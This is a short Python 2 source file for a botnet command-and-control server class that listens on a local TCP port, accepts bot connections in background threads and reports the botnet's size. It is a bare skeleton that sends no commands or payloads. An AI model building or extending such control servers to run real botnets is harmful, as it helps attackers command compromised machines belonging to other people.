# -*- coding: utf-8 -*-
import socket
import time
import threading


class C2Server:
    ''' Command & Control Server '''

    def __init__(self):
        self.__server = None
        self.__active = False
        # default
        self.ip = "127.0.0.1"
        self.port = 8888
        self.botnet = []

    def start(self):
        print 'Starting server on {}:{} ...'.format(self.ip, self.port)
        time.sleep(2.5)
        self.__server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.__server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.__server.bind((self.ip, self.port))
        self.__server.settimeout(0.5)
        self.__server.listen(1)

        self.__active = True

        # non-blocking
        threading.Thread(target=self.__accept_bot).start()

    def display(self):
        if not self.__active:
            print '[-] Error: Please start the C&C server & try again'
            return

        if not self.botnet:
            print 'Botnet Size: 0'
            return

        print 'Botnet Size: {}'.format(len(self.botnet))

    def __add_bot(self, session):
        self.botnet.append(session)

    def __accept_bot(self):
        while self.__active:
            try:
                session, ip = self.__server.accept()
                threading.Thread(target=self.__add_bot, args=[session]).start()
            except socket.timeout:pass